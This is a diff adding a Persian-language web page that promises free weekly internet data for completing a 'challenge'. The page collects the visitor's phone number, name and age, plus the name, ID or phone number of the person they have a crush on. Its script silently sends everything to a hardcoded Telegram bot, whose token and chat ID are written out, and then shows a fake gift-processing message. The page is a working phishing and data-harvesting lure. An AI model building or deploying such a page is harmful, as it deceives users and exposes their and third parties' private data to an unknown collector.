@@ -1,0 +1,138 @@
+<!DOCTYPE html>
+<html lang="fa">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>چالش</title>
+    <style>
+        body {
+            background-color: #1c1c1c;
+            color: white;
+            font-family: 'Arial', sans-serif;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+            padding: 20px;
+            flex-direction: column;
+        }
+        .container {
+            background-color: #2c2c2c;
+            padding: 30px;
+            border-radius: 15px;
+            box-shadow: 0 4px 20px rgba(0, 0, 0, 0.2);
+            width: 100%;
+            max-width: 400px;
+        }
+        h1 {
+            text-align: center;
+            color: #ff4081;
+            margin-bottom: 20px;
+        }
+        input {
+            width: 100%;
+            padding: 12px;
+            margin: 10px 0;
+            border: 1px solid #555;
+            border-radius: 5px;
+            background-color: #444;
+            color: white;
+            transition: border-color 0.3s;
+        }
+        input:focus {
+            border-color: #ff4081;
+            outline: none;
+        }
+        .button {
+            width: 100%;
+            padding: 12px;
+            background-color: #ff4081;
+            color: white;
+            border: none;
+            border-radius: 5px;
+            cursor: pointer;
+            font-size: 16px;
+            transition: background-color 0.3s;
+        }
+        .button:hover {
+            background-color: #e91e63;
+        }
+        .hidden {
+            display: none;
+        }
+        .info {
+            margin-top: 20px;
+            font-size: 14px;
+            color: #aaa;
+            text-align: center;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h1>چالش</h1>
+        <p>در صورت تکمیل کردن چالش، به شما یک گیگ اینترنت هفتگی رایگان تعلق می‌گیرد.</p>
+        
+        <input type="tel" id="phone" placeholder="شماره همراه" required>
+        <button id="nextButton" class="button">بعدی</button>
+
+        <div id="challengeForm" class="hidden">
+            <input type="text" id="name" placeholder="نام خود را وارد کنید" required>
+            <input type="number" id="age" placeholder="سن خود را وارد کنید" required>
+            <input type="text" id="crushName" placeholder="نام کراش خود را وارد کنید" required>
+            <input type="text" id="crushId" placeholder="ایدی یا شماره کراش خود را وارد کنید" required>
+            <input type="text" id="interest" placeholder="از چه لحاظ به او علاقه مندید" required>
+            <button id="submitButton" class="button">پایان و دریافت هدیه</button>
+        </div>
+    </div>
+
+    <script>
+        let isCounted = false; // متغیر برای پیگیری وضعیت شمارش
+        let phone; // متغیر برای ذخیره شماره تلفن
+
+        document.getElementById('nextButton').addEventListener('click', function() {
+            phone = document.getElementById('phone').value; // ذخیره شماره تلفن
+            if (phone) {
+                if (!isCounted) {
+                    console.log("شمارش انجام شد");
+                    isCounted = true;
+                }
+                document.getElementById('challengeForm').classList.remove('hidden');
+            } else {
+                alert('لطفاً شماره همراه خود را وارد کنید.');
+            }
+        });
+
+        document.getElementById('submitButton').addEventListener('click', function() {
+            const name = document.getElementById('name').value;
+            const age = document.getElementById('age').value;
+            const crushName = document.getElementById('crushName').value;
+            const crushId = document.getElementById('crushId').value;
+            const interest = document.getElementById('interest').value;
+
+            if (name && age && crushName && crushId && interest) {
+                sendToTelegram(phone, name, age, crushName, crushId, interest); // ارسال شماره تلفن و اطلاعات دیگر
+                alert('چالش با موفقیت تکمیل شد! هدیه شما در حال پردازش است.');
+            } else {
+                alert('لطفاً تمام فیلدها را پر کنید.');
+            }
+        });
+
+        function sendToTelegram(phone, name, age, crushName, crushId, interest) {
+            const token = '7319426902:AAGA69QPVfiWYv-z6VPZ9Xhp-PEHZZzZqoY'; // توکن ربات شما
+            const chatId = '6921507458'; // آیدی چت شما
+            const message = `شماره همراه: ${phone}\nنام: ${name}\nسن: ${age}\nنام کراش: ${crushName}\nایدی یا شماره کراش: ${crushId}\nعلاقه: ${interest}`;
+            const url = `https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`;
+
+            fetch(url)
+                .then(response => {
+                    if (!response.ok) {
+                        throw new Error('Error sending message');
+                    }
+                })
+                .catch(error => console.error(error));
+        }
+    </script>
+</body>
+</html>
